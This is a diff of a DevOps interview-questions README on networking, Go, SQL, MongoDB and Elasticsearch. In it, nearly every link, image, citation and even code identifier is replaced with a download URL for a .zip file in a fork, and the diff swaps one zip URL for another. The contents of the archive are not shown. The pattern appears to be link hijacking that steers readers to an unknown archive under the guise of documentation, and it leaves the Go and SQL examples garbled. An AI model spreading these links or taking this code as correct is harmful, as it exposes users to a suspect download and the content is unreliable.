+    <td align="center"><a href="#system-design"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Design"/><br /><b>System Design</b></a></td>
    </tr>
 
    <tr>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Chaos Engineering"/><br /><b>Chaos Engineering</b></a></td>
-    <td align="center"><a href="#Misc"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Misc"/><br /><b>Misc</b></a></td>
-    <td align="center"><a href="#elastic"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Elastic"/><br /><b>Elastic</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="85px;" height="80px;" alt="Kafka"/><br /><b>Kafka</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Chaos Engineering"/><br /><b>Chaos Engineering</b></a></td>
+    <td align="center"><a href="#Misc"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Misc"/><br /><b>Misc</b></a></td>
+    <td align="center"><a href="#elastic"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Elastic"/><br /><b>Elastic</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="85px;" height="80px;" alt="Kafka"/><br /><b>Kafka</b></a></td>
    </tr>
    
 </table>
@@ -118,7 +118,7 @@
 
 A set of protocols that define how two or more devices can communicate with each other.
 
-To learn more about TCP/IP, read [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+To learn more about TCP/IP, read [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 </b></details>
 
@@ -147,7 +147,7 @@ When a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF​)
 <details>
 <summary>What is an IP address?</summary><br><b>
 
-An Internet Protocol address (IP address) is a numerical label assigned to each device connected to a computer network that uses the Internet Protocol for https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip IP address serves two main functions: host or network interface identification and location addressing.
+An Internet Protocol address (IP address) is a numerical label assigned to each device connected to a computer network that uses the Internet Protocol for https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip IP address serves two main functions: host or network interface identification and location addressing.
 </b></details>
 
 <details>
@@ -155,7 +155,7 @@ An Internet Protocol address (IP address) is a numerical label assigned to each 
 
 A Subnet mask is a 32-bit number that masks an IP address and divides the IP addresses into network addresses and host addresses. Subnet Mask is made by setting network bits to all "1"s and setting host bits to all "0"s. Within a given network, out of the total usable host addresses, two are always reserved for specific purposes and cannot be allocated to any host. These are the first address, which is reserved as a network address (a.k.a network ID), and the last address used for network broadcast.
 
-[Example](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Example](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 </b></details>
 
@@ -180,7 +180,7 @@ A public IP address is a public-facing IP address. In the event that you were ho
 - Data link: provides a link between two directly connected nodes (MAC is here)
 - Physical: the electrical and physical spec of the data connection (Bits are here)
 
-You can read more about the OSI model in [https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+You can read more about the OSI model in [https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -298,7 +298,7 @@ A three-way handshake is primarily used to create a TCP socket connection. It wo
 <details>
 <summary>What is round-trip delay or round-trip time?</summary><br><b>
 
-From [wikipedia](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip): "the length of time it takes for a signal to be sent plus the length of time it takes for an acknowledgment of that signal to be received"
+From [wikipedia](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip): "the length of time it takes for a signal to be sent plus the length of time it takes for an acknowledgment of that signal to be received"
 
 Bonus question: what is the RTT of LAN?
 </b></details>
@@ -324,7 +324,7 @@ SSL handshake is a process that establishes a secure connection between a client
 
 TCP establishes a connection between the client and the server to guarantee the order of the packages, on the other hand, UDP does not establish a connection between the client and server and doesn't handle package orders. This makes UDP more lightweight than TCP and a perfect candidate for services like streaming.
 
-[https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) provides a good explanation.
+[https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) provides a good explanation.
 </b></details>
 
 <details>
@@ -364,7 +364,7 @@ It stands for Dynamic Host Configuration Protocol and allocates IP addresses, su
 * Depending on which offer is accepted, the client sends back a reply broadcast letting all DHCP servers know (DHCP REQUEST)
 * The server sends an acknowledgment (DHCP ACK)
 
-Read more [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+Read more [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -580,7 +580,7 @@ The OSPF 4 Types of routers are:
   * Autonomous Systems Boundary Routers
   * Backbone Routers
 
-  Learn more about OSPF router types: https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip
+  Learn more about OSPF router types: https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip
 </b></details>
 
 <details>
@@ -677,7 +677,7 @@ To prevent network congestion, it's important to monitor your network usage and 
 <summary>What is HSTS?</summary><br><b>
 HTTP Strict Transport Security is a web server directive that informs user agents and web browsers how to handle its connection through a response header sent at the very beginning and back to the browser. This forces connections over HTTPS encryption, disregarding any script's call to load any resource in that domain over HTTP.
 
-Read more [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip~:text=HTTP%20Strict%20Transport%20Security%20(HSTS,and%20back%20to%20the%20browser.)
+Read more [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip~:text=HTTP%20Strict%20Transport%20Security%20(HSTS,and%20back%20to%20the%20browser.)
 </b></details>
 
 #### Network - Misc
@@ -701,8 +701,8 @@ ISP (Internet Service Provider) is the local internet company provider.
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-|Fork 101|Fork|[Link](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)|[Link](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
-|Fork 102|Fork|[Link](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)|[Link](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+|Fork 101|Fork|[Link](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)|[Link](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
+|Fork 102|Fork|[Link](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)|[Link](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 ### Operating System - Self Assessment
 
@@ -794,7 +794,7 @@ CPU scheduler
 <summary>What is "virtual memory" and what purpose it serves?</summary><br><b>
 
 Virtual memory combines your computer's RAM with temporary space on your hard disk. When RAM runs low, virtual memory helps to move data from RAM to a space called a paging file. Moving data to paging file can free up the RAM so your computer can complete its work. In general, the more RAM your computer has, the faster the programs run.
-https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip
+https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip
 </b></details>
 
 <details>
@@ -857,7 +857,7 @@ Virtualization uses software to create an abstraction layer over computer hardwa
 
 Red Hat: "A hypervisor is software that creates and runs virtual machines (VMs). A hypervisor, sometimes called a virtual machine monitor (VMM), isolates the hypervisor operating system and resources from the virtual machines and enables the creation and management of those VMs."
 
-Read more [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+Read more [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -1136,13 +1136,13 @@ func main() {
     var x int = 101
     var y string
     y = string(x)
-    https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip(y)
+    https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip(y)
 }
 ```
 </summary><br><b>
 
 It looks what unicode value is set at 101 and uses it for converting the integer to a string.
-If you want to get "101" you should use the package "strconv" and replace <code>y = string(x)</code> with <code>y = https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip(x)</code>
+If you want to get "101" you should use the package "strconv" and replace <code>y = string(x)</code> with <code>y = https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip(x)</code>
 </b></details>
 
 <details>
@@ -1180,9 +1180,9 @@ const (
 const z = iota
 
 func main() {
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("%v\n", x)
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("%v\n", y)
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("%v\n", z)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("%v\n", x)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("%v\n", y)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("%v\n", z)
 }
 ```
 </summary><br><b>
@@ -1191,16 +1191,16 @@ Go's iota identifier is used in const declarations to simplify definitions of in
 <br>
 `x` and `y` in the first iota group, `z` in the second.
 <br>
-[Iota page in Go Wiki](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Iota page in Go Wiki](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
 <summary>What _ is used for in Go?</summary><br><b>
 
 It avoids having to declare all the variables for the returns values.
-It is called the [blank identifier](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip).
+It is called the [blank identifier](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip).
 <br>
-[answer in SO](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[answer in SO](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -1217,7 +1217,7 @@ const (
 )
 
 func main() {
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("%v\n", x)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("%v\n", x)
 }
 ```
 </summary><br><b>
@@ -1238,30 +1238,30 @@ import (
 )
 
 func main() {
-	var wg https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip
+	var wg https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip
 
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip(1)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip(1)
 	go func() {
-		https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip(https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip * 2)
-		https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("1")
-		https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip()
+		https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip(https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip * 2)
+		https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("1")
+		https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip()
 	}()
 
 	go func() {
-		https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("2")
+		https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("2")
 	}()
 
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip()
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("3")
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip()
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("3")
 }
 ```
 </summary><br><b>
 
 Output: 2 1 3
 
-[Aritcle about sync/waitgroup](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Aritcle about sync/waitgroup](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
-[Golang package sync](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Golang package sync](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -1279,7 +1279,7 @@ func mod1(a []int) {
 		a[i] = 5
 	}
 
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("1:", a)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("1:", a)
 }
 
 func mod2(a []int) {
@@ -1289,17 +1289,17 @@ func mod2(a []int) {
 		a[i] = 5
 	}
 
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("2:", a)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("2:", a)
 }
 
 func main() {
 	s1 := []int{1, 2, 3, 4}
 	mod1(s1)
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("1:", s1)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("1:", s1)
 
 	s2 := []int{1, 2, 3, 4}
 	mod2(s2)
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip("2:", s2)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip("2:", s2)
 }
 ```
 </summary><br><b>
@@ -1314,8 +1314,8 @@ Output: <code><br>
 In `mod1` a is link, and when we're using `a[i]`, we're changing `s1` value to.
 But in `mod2`, `append` creates new slice, and we're changing only `a` value, not `s2`.
 
-[Aritcle about arrays](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip),
-[Blog post about `append`](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Aritcle about arrays](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip),
+[Blog post about `append`](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -1352,17 +1352,17 @@ func (h *IntHeap) Pop() interface{} {
 
 func main() {
 	h := &IntHeap{4, 8, 3, 6}
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip(h)
-	https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip(h, 7)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip(h)
+	https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip(h, 7)
 
-  https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip((*h)[0])
+  https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip((*h)[0])
 }
 ```
 </summary><br><b>
 
 Output: 3
 
-[Golang container/heap package](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+[Golang container/heap package](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 ## Mongo
@@ -1423,11 +1423,11 @@ as key-value pair, document-oriented, etc.
 ##### Queries
 
 <details>
-<summary>Explain this query: <code>https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip({"name": /abc/})</code></summary><br><b>
+<summary>Explain this query: <code>https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip({"name": /abc/})</code></summary><br><b>
 </b></details>
 
 <details>
-<summary>Explain this query: <code>https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip().sort({x:1})</code></summary><br><b>
+<summary>Explain this query: <code>https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip().sort({x:1})</code></summary><br><b>
 </b></details>
 
 <details>
@@ -1450,7 +1450,7 @@ as key-value pair, document-oriented, etc.
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| Functions vs. Comparisons | Query Improvements | [Exercise](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) | [Solution](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+| Functions vs. Comparisons | Query Improvements | [Exercise](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) | [Solution](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 ### SQL Self Assessment
 
@@ -1549,10 +1549,10 @@ both the Customers table and Orders table
 <details>
 <summary>How would you show which customer ordered which items?</summary><br><b>
 
-Select https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip, https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip <br>
+Select https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip, https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip <br>
 From Customers c <br>
 Left Join Orders o <br>
-  On https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip = https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip;
+  On https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip = https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip;
 
 </b></details>
 
@@ -1568,8 +1568,8 @@ Group by Customer_ID <br>
 Select Customer_name, TOTAL_PRICE <br>
 From Customers c <br>
 Inner JOIN cat_food f <br>
-  ON https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip = https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip <br>
-where https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip in (Select Customer_ID from cat_food);
+  ON https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip = https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip <br>
+where https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip in (Select Customer_ID from cat_food);
 
 Although this was a simple statement, the "with" clause really shines when
 a complex query needs to be run on a table before joining to another. With statements are nice,
@@ -1680,7 +1680,7 @@ When you use a function (`YEAR(purchased_at)`) it has to scan the whole database
 <details>
 <summary>Are you familiar with TripleO? How is it different from Devstack or Packstack?</summary><br><b>
 
-You can read about TripleO right [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+You can read about TripleO right [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 #### OpenStack Compute
@@ -2128,7 +2128,7 @@ Elasticsearch, Logstash and Kibana are also known as the ELK stack.
 <details>
 <summary>Explain what is Elasticsearch</summary><br><b>
 
-From the official [docs](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip):
+From the official [docs](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip):
 
 "Elasticsearch is a distributed document store. Instead of storing information as rows of columnar data, Elasticsearch stores complex data structures that have been serialized as JSON documents"
 </b></details>
@@ -2136,7 +2136,7 @@ From the official [docs](https://raw.githubusercontent.com/sivahariu/devops-exer
 <details>
 <summary>What is Logstash?</summary><br><b>
 	
-From the [blog](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip):
+From the [blog](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip):
 
 "Logstash is a powerful, flexible pipeline that collects, enriches and transports data. It works as an extract, transform & load (ETL) tool for collecting log messages."
 </b></details>
@@ -2299,7 +2299,7 @@ Term Frequency is how often a term appears in a given document and Document Freq
 <summary>You check "Current Phase" under "Index lifecycle management" and you see it's set to "hot". What does it mean?</summary><br><b>
 
 "The index is actively being written to".
-More about the phases [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+More about the phases [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
@@ -2435,11 +2435,11 @@ Filebeat is a typical component of the ELK stack, since it was developed by Elas
 <details>
 <summary>What is a harvester?</summary><br><b>
 
-Read [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+Read [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 </b></details>
 
 <details>
-<summary>True or False? a single harvester harvest multiple files, according to the limits set in https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip</summary><br><b>
+<summary>True or False? a single harvester harvest multiple files, according to the limits set in https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip</summary><br><b>
 
 False. One harvester harvests one file.
 </b></details>
@@ -2465,7 +2465,7 @@ You can generate certificates with the provided elastic utils and change configu
 
 According to Martin Kleppmann:
 
-"Many processes running on many https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip message-passing via an unreliable network with variable delays, and the system may suffer from partial failures, unreliable clocks, and process pauses."
+"Many processes running on many https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip message-passing via an unreliable network with variable delays, and the system may suffer from partial failures, unreliable clocks, and process pauses."
 
